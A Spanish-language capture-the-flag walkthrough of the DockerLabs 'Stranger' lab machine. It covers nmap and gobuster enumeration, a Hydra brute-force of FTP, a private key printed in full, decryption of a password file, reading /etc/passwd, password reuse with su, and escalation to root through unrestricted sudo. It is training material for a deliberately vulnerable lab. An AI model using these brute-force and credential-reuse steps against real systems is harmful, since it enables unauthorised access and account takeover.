# Stranger DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip stranger.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh stranger.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 05:04 EST
Nmap scan report for insanity.dl (172.17.0.2)
Host is up (0.000040s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:af:01:77:e8:fc:a4:95:85:6b:5c:9c:c7:c1:d3:98 (ECDSA)
|_  256 36:7e:d3:25:fa:59:38:8f:2e:21:f9:f0:28:a4:7e:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: welcome
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: my; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds
```

Si entramos en la pagina solo veremos este mensaje, que por lo que parece es un nombre de usuario que nos guardaremos:

```
Welcome mwheeler!!
```

Vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 231]
/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un directorio bastante interesante llamado `/strange` que si entramos dentro veremos una pagina web:

<figure><img src="../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

Pero tampoco veremos nada interesante, por lo que volveremos a realizar un poco mas de `fuzzing`.

```shell
gobuster dir -u http://<IP>/strange -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/strange
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 3040]
/private.txt          (Status: 200) [Size: 64]
/secret.html          (Status: 200) [Size: 172]
/.html                (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos `2` cosas interesantes una de ellas llamada `/private.txt` y la otra `/secret.html`.

Si nos descargamos el `private.txt` veremos que si lo leemos estara encriptado, por lo que tendremos que desencriptarlo, pero lo dejaremos para mas tarde.

Si entramos al `secret.html` veremos lo siguiente:

```
The ftp user is admin, but the password is ...
You must discover it.
A hint: The rockyou diccionary is correct for use!
```

Aqui vemos que podremos utilizar fuerza bruta con el usuario `admin` con el diccionario `rockyou.txt` sobre el `FTP`.

## FTP

```shell
hydra -l admin -P <WORDLIST> ftp://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-23 05:30:06
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ftp://172.17.0.2:21/
[21][ftp] host: 172.17.0.2   login: admin   password: banana
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 14 final worker threads did not complete until end.
[ERROR] 14 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-23 05:30:29
```

Vemos que conseguimos las credenciales, por lo que nos conectaremos a dicho puerto de la siguiente forma:

```shell
ftp admin@<IP>
```

Metemos como contraseña `banana` y veremos que estamos dentro.

Si listamos los archivos veremos lo siguiente:

```
ftp> ls
229 Entering Extended Passive Mode (|||40004|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             522 May 01  2024 private_key.pem
226 Directory send OK.
```

Por lo que nos descargaremos el siguiente archivo.

```shell
get private_key.pem
```

Si la leemos veremos lo siguiente:

```
-----BEGIN PRIVATE KEY-----
MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA4/scrsX2G1QjCHdP
B8DM4PKeGCvzmxHgrrO6OB6o+OxsWKi6t20tqEv9UEtDIT5SthFWT4QTc9gqfmFf
xiSm3wIDAQABAkA6kC//CWU+Ae/55cQMZs96XXiVFv098Wq5FfwZHG8legIA0Qpz
oW2UQkV7ksXXF6kX7swQy/zCFJiIwbwxo47RAiEA8ma+qMEX61qI99DhsEVRhcVD
uo8edZeb/Sfg6b3cZscCIQDwxUSDi0BU77ZfqK3AwQwy7632wL7yJf76JdJspPFH
KQIgWe4Yag9JSn3KNvZ95KGy/wgSepJCYKogqykyXkWcEV0CIQC1Pmpi85JL3d9V
hy606R17wn0cQN/8fKnCOHJ8onWWcQIhAL5OKJjHADl0cgiv352WwIztGlbhKMuI
ajmuxxKdJvFL
-----END PRIVATE KEY-----
```

## Escalate user mwheeler

Vemos que puede ser la clave para desencriptar el archivo cifrado llamado `private.txt` de la siguiente forma:

```shell
openssl pkeyutl -decrypt -in private.txt -out decrypted.txt -inkey private_key.pem
```

Echo esto se nos generara el archivo `decrypted.txt` y si lo leemos veremos lo siguiente:

```
demogorgon
```

Por lo que vemos obtener una contraseña que posiblemente puede ser del primero usuario que vimos anteriormente en la primera pagina llamado `mwheeler`, por lo que probaremos lo siguiente:

### SSH

```shell
ssh mwheeler@<IP>
```

Metemos como contraseña `demogorgon` y veremos que estamos dentro.

## Escalate user admin

Si listamos los usuarios que hay en el sistema veremos lo siguiente:

```shell
cat /etc/passwd | grep "/bin/*"
```

Info:

```
root:x:0:0:root:/root:/bin/bash
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
mwheeler:x:1001:1001::/home/mwheeler:/bin/bash
admin:x:1002:1002::/home/admin:/bin/sh
```

Vemos que esta el usuario `admin` por lo que veremos a probar a reutilizar la contraseña que encontramos en el `FTP`.

```shell
su admin
```

Metemos como contraseña `banana` y veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for admin on 9de778984302:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User admin may run the following commands on 9de778984302:
    (ALL) ALL
```

Vemos que podemos ejecutar cualquier cosas como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo su
```

Y con esto veremos que somos `root`, por lo que habremos terminado la maquina y leeremos la flag de `root`.

> flag.txt

```
This is the root flat - Fl@ggR00t -
```
